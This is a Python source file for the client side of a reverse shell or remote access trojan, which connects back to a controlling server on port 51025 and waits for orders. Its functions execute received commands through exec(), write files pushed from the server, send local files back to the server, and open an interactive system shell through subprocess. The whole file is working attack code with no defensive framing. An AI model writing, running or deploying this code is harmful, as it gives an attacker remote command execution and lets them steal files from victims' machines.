#import the required modules
import socket
import subprocess
import os
import struct



class Client(): #class Client: define the client properties
    def __init__(self, server = None):
        self.server = server
        self.HOST = "127.0.0.1"
        self.PORT = 51025

    def send(self, data): #custom send function
        pkt = struct.pack('>I', len(data)) + data
        self.server.sendall(pkt)

    def recv(self): #custom recv function
        pktlen = self.recvall(4)
        if not pktlen: return ""
        pktlen = struct.unpack('>I', pktlen)[0]
        return self.recvall(pktlen)

    def recvall(self, n): #format the receipts packets
        packet = b''
        while len(packet) < n:
            frame = self.server.recv(n - len(packet))
            if not frame:
                return None
            packet += frame
        return packet



def connect(): #connect to the server and retry all 5 seconds
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((Client().HOST, Client().PORT))
    interpreter(server)


def interpreter(server): #wait for commands from the server and interpret them
    global client
    client = Client(server)
    while True:
        command = client.recv().decode()
        if command == 'exit':
            exit()
        else:
            exec(f"{command}()")




def upload(): #upload command: upload a file to the client
    file_content = client.recv()
    file_name = client.recv()
    with open(file_name, "wb") as file:
        file.write(file_content)


def download(): #download command: download a file from the client
    local_path = client.recv().decode()
    with open(local_path, 'rb') as file:
        while True:
            a = file.read(1024)
            if not a:
                break
            client.send(a)
    client.send(local_path.split('/')[-1].encode())


def cmd(): #cmd command: open a shell on the client machine
    while True:
        dir = os.getcwd() + '>'
        client.send(dir.encode())
        cmd = client.recv().decode()
        if cmd[0:2] == 'cd':
            try:
                os.chdir(''.join(cmd[3:]))
                output = ''.encode()
            except FileNotFoundError:
                output = "File or directory not found!"
        elif cmd == 'exit':
            break
        else:
            shell = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
            stderr = subprocess.PIPE, stdin=subprocess.PIPE)
            output = shell.stdout.read() + shell.stderr.read()
        client.send(bytes(output))



connect()